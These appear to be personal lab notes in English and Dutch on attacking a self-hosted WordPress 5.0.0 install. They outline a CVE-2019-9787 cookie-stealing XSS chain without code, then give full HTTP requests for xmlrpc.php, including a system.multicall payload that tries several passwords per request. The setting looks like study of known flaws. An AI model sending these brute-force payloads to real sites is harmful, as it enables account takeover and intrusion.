**Current choice**

Remote code execution on wordpress 2019 https://www.cvedetails.com/cve/CVE-2019-9787/ - SCORE 6.8 - COMPLEXITY: medium

    WordPress before 5.1.1 does not properly filter comment content, leading to Remote Code Execution by unauthenticated users in a default configuration. This occurs because CSRF protection is mishandled, and because Search Engine Optimization of A elements is performed incorrectly, leading to XSS. The XSS results in administrative access, which allows arbitrary changes to .php files. This is related to wp-admin/includes/ajax-actions.php and wp-includes/comment.php.

Needs wordpress before 5.1.1 https://wordpress.org/download/releases/#branch-50  
Use the 5.0.0 version

Host wordpress website, 
wordpress needs sql server
Create XSS javascript code that steals the cookie
Make admin look at comment
Inject cookie into server

https://www.youtube.com/watch?v=BfKK-pNmI6Y



**EXTRA** 

Wordpress bruteforce and ddos vulnerability 
/xmlrpc.php attack

        POST /xmlrpc.php HTTP/1.1
        Host: localhost
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Sec-Fetch-Site: none
        Sec-Fetch-Mode: navigate
        Sec-Fetch-User: ?1
        Sec-Fetch-Dest: document
        Accept-Encoding: gzip, deflate
        Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
        Connection: close
        Content-Length: 85


        PAYLOAD 2: 

        <methodCall><methodName>system.listMethods</methodName><params></params></methodCall>

        POST /xmlrpc.php HTTP/1.1
        Host: localhost
        Upgrade-Insecure-Requests: 1
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
        Sec-Fetch-Site: none
        Sec-Fetch-Mode: navigate
        Sec-Fetch-User: ?1
        Sec-Fetch-Dest: document
        Accept-Encoding: gzip, deflate
        Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
        Connection: close
        Content-Length: 164

        <methodCall>
        <methodName>wp.getUsersBlogs</methodName>
        <params>
        <param><value>admin</value></param>
        <param><value>pass</value></param>
        </params>
        </methodCall>



MULTICALL om meerdere tegelijkertijd te proberen , ookal showed het dan maar op als 1 try voor wordpress zelf
        
        <methodCall>
        <methodName>system.multicall</methodName>
        <params>
            <param>
            <value>
                <array>
                <data>
                    <value>
                    <struct>
                        <member>
                        <name>methodName</name>
                        <value><string>wp.getUsersBlogs</string></value>
                        </member>
                        <member>
                        <name>params</name>
                        <value>
                            <array>
                            <data>
                                <value><string>admin</string></value>
                                <value><string>password1</string></value>
                            </data>
                            </array>
                        </value>
                        </member>
                    </struct>
                    </value>
                    <value>
                    <struct>
                        <member>
                        <name>methodName</name>
                        <value><string>wp.getUsersBlogs</string></value>
                        </member>
                        <member>
                        <name>params</name>
                        <value>
                            <array>
                            <data>
                                <value><string>admin</string></value>
                                <value><string>password2</string></value>
                            </data>
                            </array>
                        </value>
                        </member>
                    </struct>
                    </value>
                </data>
                </array>
            </value>
            </param>
        </params>
        </methodCall>


https://www.cvedetails.com/cve/CVE-2020-28035/
https://www.cvedetails.com/cve/CVE-2020-28036/
https://www.youtube.com/watch?v=bZQ6vuFioZQ

Via xmlrpc can you proberen inloggen en meerdere passwords en logins proberen tegelijkertijd. 


